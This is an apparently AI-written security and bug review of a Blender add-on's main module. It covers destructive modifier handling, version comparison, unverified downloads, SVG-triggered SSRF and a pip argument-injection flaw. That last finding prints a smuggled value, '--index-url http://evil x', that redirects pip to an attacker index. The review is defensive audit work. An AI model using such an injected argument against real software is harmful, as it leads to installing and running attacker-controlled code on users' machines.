# BUG review: PatternSkin\__init__.py

- source: `C:\Users\User\source\repos\Nexusmill\PatternSkin\__init__.py`
- model: moonshotai/kimi-k3
- reviewed: 2026-07-19 20:55
- tokens: in 103141 / out 6440
- est cost: $0.4060

---

## Verdict
Mostly shippable: the obvious attack surfaces (zip extraction traversal, pip index allowlist, pip `--only-binary`, secret storage) were deliberately handled. The biggest real risk is destructive modifier handling in `_punch_holes` (silently bakes and deletes *all* pre-existing modifiers on the user's object), plus a broken version comparison that will stop offering Asset Forge updates once versions hit double digits.

## Bugs & vulnerabilities

**[HIGH] `_punch_holes._apply` destroys unrelated modifiers on the user's mesh** - `line 2727-2729`
- What: `baked = bpy.data.meshes.new_from_object(obj.evaluated_get(deps))` bakes the *entire* evaluated modifier stack, then `obj.modifiers.clear()` removes every modifier — not just the "holes" boolean it added.
- Trigger: Generate scales / outline scales (which call `_punch_holes`) on a workflow where the scale object somehow carries other modifiers (e.g. user duplicates a prepared object, or the boolean is re-run after a previous partial failure left state).
- Impact: Silent, destructive loss of the user's modifier stack (Subsurf, Mirror, etc. permanently applied and removed) — data loss on an object the tool claims only to add holes to.
- Fix: Apply only the boolean modifier (`bpy.ops.object.modifier_apply(modifier=mod.name)` with the object active) or remove just `mod` after baking a copy; never call `obj.modifiers.clear()`.

**[MEDIUM] Asset Forge update detection uses lexicographic version comparison** - `line 5839`
- What: `if bundled and (not installed or bundled > installed)` compares version *strings*: `"1.10" > "1.9"` is `False`.
- Trigger: Bundled `VERSION` = `1.10.x`, installed = `1.9.x` (or any crossing of a digit-width boundary).
- Impact: The panel reports "Installed on this computer" and never offers the Update button; users stay on an old build indefinitely. Silent failure.
- Fix: Parse with the existing `_ver_tuple()` and compare tuples: `_ver_tuple(bundled) > _ver_tuple(installed)`.

**[MEDIUM] Default-library download has no integrity/authenticity check** - `line 3842-3860`
- What: `DEFAULT_LIBRARY_URL` zip is fetched over HTTPS and extracted with only path-traversal filtering — no hash/signature verification, and the URL is also plain config that a local attacker (or DNS/cert compromise) can redirect.
- Trigger: Compromised download server or a tampered user-supplied zip via "Install from a .zip".
- Impact: Arbitrary files written anywhere under the library dir (traversal is blocked, but attacker-controlled PNGs land in a folder the add-on later loads/previews; a malicious image is a decoder-exploit delivery vector into Blender).
- Fix: Pin and verify a SHA-256 of the shipped zip before extracting; reject on mismatch.

**[LOW] `_stamp_stl_header` misdetects binary STLs whose header starts with "solid "** - `line 1347`
- What: `data[:6].lower() == b"solid "` is treated as ASCII STL. Many *binary* STL writers (including some exporters) start their 80-byte header with "solid ".
- Trigger: Exporting through a path that produces such a header.
- Impact: License stamp is silently skipped (the intended courtesy stamp never lands) — silent failure; worst case, a proper binary/ASCII sniff would be needed to stamp safely.
- Fix: Detect binary by validating file length against the tri count at offset 80 (`84 + 50*count == len(data)`) instead of the "solid " heuristic.

**[LOW] `_rasterize_svg` passes user SVGs to cairosvg with network fetching enabled** - `line 64`
- What: `cairosvg.svg2png(url=path, ...)` resolves external `href`/`url()` references in the SVG; CairoSVG will fetch `http(s)://` resources embedded in the file.
- Trigger: User opens a malicious third-party SVG as a pattern.
- Impact: SSRF-style outbound requests from the user's machine when merely previewing an SVG (information disclosure via fetch callbacks; intranet probing).
- Fix: Pre-sanitize the SVG (strip external hrefs) or pass a wrapper that blocks non-file URLs before handing it to cairosvg.

**[LOW] `PATTERNSKIN_OT_install_accel` splits an operator property into pip argv** - `line 2010`
- What: `args += self.packages.split()` — `packages` is a public operator `StringProperty`; a script/keymap can invoke `bpy.ops.patternskin.install_accel(packages="--index-url http://evil x")` and the index-url allowlist at line 2005-2009 is bypassed because the injected flag lands after it.
- Trigger: Malicious/third-party script or addon calling the operator with crafted `packages`.
- Impact: pip installs attacker-controlled wheels into the user modules dir → code execution inside Blender.
- Fix: Validate `self.packages` against `^[A-Za-z0-9_.\- ]+$` (and reject tokens starting with `-`) before building `args`.

**[LOW] `_save_gray_png` leaks a Blender image datablock on save failure** - `line 1022-1030`
- What: `bpy.data.images.remove(img)` only runs on the success path; if `img.save()` raises (bad path, permissions), the `_ps_tmp_save` image stays in `bpy.data.images`.
- Trigger: Unwritable output path.
- Impact: Accumulating orphan images named `_ps_tmp_save` in the .blend across failures.
- Fix: Wrap in try/finally: `try: img.save() finally: bpy.data.images.remove(img)`.

**[LOW] `_retry_transient` substring matching misfires** - `line 2390-2392`
- What: `"500" in msg` (and "502" etc.) matches any error string containing those digits (e.g. "input must be 1500px", port numbers, prediction IDs), causing pointless paid retries; conversely real transient errors phrased without those tokens aren't retried.
- Fix: Match structured status codes from the client exception rather than substring-scanning `str(e)`.

**[LOW] `PATTERNSKIN_OT_ai_parts_regran._ctx_of` is a stub returning `None`** - `line 5503, 5516-5517`
- What: `execute` passes `self._ctx_of(obj)` (always `None`) into `_ap.regranulate(job, ctx, ...)`. If `regranulate` dereferences `ctx` (unlike the `ai_detail` path which also passes `None` but may guard), this operator always fails or behaves differently from the working Detail path.
- Trigger: Calling `patternskin.ai_parts_regran` after a scan.
- Impact: Operator silently broken / depends entirely on `ai_parts.regranulate` tolerating `None` — unfinished code shipped.
- Fix: Either resolve the real ctx via `_sel_ctx(obj)` or delete the redundant operator (Detail already covers it).

**[LOW] `unregister()` can raise mid-teardown** - `line 6040-6042`
- What: `del bpy.types.Scene.pattern_skin` and the class-unregister loop have no exception guards; if `register()` partially failed (e.g. one class failed to register), `unregister()` raises and leaves the rest registered.
- Fix: Wrap in try/except like the rest of the function, and track actually-registered classes.

## Missing safeguards
- No test coverage is visible for the pure-numpy cores (`_parallel_transport_frames`, `_resample_polyline`, `project_swept3d`, `make_seamless`, `_ai_poly_part`) despite the comments claiming they were designed to be unit-testable — these are exactly where off-by-one/seam regressions will reappear.
- `apply_pattern` has no guard for empty meshes (`nv == 0`): `P.mean(0)`/`P.max(0)` on an empty array raise or produce NaNs; the operator's blanket `except` hides it as a generic error instead of a clear "mesh has no vertices" message.
- `_load_heightmap_uncached` doesn't validate `img.size != (0, 0)` before `reshape`, so a corrupt/unsupported image fails with a cryptic numpy reshape error rather than a user-facing message.
- No size/decompression limit on the library zip install (zip-bomb: `dstf.write(src.read())` unbounded) — cap per-file and total extracted bytes.
- `_HM_CACHE` is keyed on `(path, mtime)`; no size guard on the cached arrays themselves beyond count — a 8k tile pins ~256 MB per entry ×4. Consider a byte budget.
- `_stamp_stl_header` reads the entire STL into memory (`f.read()`); large exports (hundreds of MB after subdivision) spike memory — stream the 80-byte header rewrite in place instead.
- Session/preset/license JSON loads (`_user_presets`, `_load_license`, `_restore_session_settings`) trust file contents blindly — at minimum validate types before `setattr` on Blender properties (a hand-edited JSON with wrong types currently fails per-key silently, which is acceptable, but no test pins that behavior).